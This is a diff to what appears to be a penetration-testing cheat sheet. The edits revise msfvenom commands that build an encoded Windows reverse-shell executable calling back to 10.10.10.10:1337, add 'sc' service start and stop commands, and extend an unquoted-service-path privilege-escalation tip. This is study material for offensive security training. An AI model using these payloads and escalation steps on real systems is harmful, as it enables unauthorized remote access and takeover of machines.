@@ -473,10 +473,14 @@ msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FILE_FORMAT > $OUTPUT_FILE
 
 Reverse shell Windows :  
 ```
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe -o $OUTPUT_FILE
+# exe
+msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > rev.exe
+
+# additional parameters
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe > $OUTPUT_FILE
 ```
 Example :  
-`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -b "\x00" -e x86/shikata_ga_nai -f exe -o rev.exe`  
+`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -b "\x00" -e x86/shikata_ga_nai -f exe > rev.exe`  
 
 -a : architecture  
 -b : bad characters  
@@ -656,6 +660,10 @@ powershell -ep bypass .\file.ps1
 
 # load .ps1
 . .\file.ps1
+
+# start or stop service
+sc start $service
+sc stop $service
 ```
 
 More [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md), [here](https://www.fuzzysecurity.com/tutorials/16.html) and [here](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html).
@@ -734,7 +742,7 @@ With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerU
 
 - Unquoted service paths  
 
-Look for (wait for it...) unquoted service paths in registry `HKLM\SYSTEM\CurrentControlSet\services`. If you find one, create a malicious executable with msfvenom and place it in adequate location. For example if some service has unoquoted path, like `c:\program files\vulnerable path\executable.exe`, you can place and rename the executable in `c:\program.exe` or `c:\program files\vulnerable.exe`.  
+Look for (wait for it...) unquoted service paths in registry `HKLM\SYSTEM\CurrentControlSet\services`. If you find one, create a malicious executable with msfvenom and place it in adequate location. For example if some service has unoquoted path, like `c:\program files\vulnerable path\executable.exe`, you can place and rename the executable in `c:\program.exe` or `c:\program files\vulnerable.exe` and then restart the service.  
 
 With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-UnquotedService` and abuse with `Write-ServiceBinary`.  
 
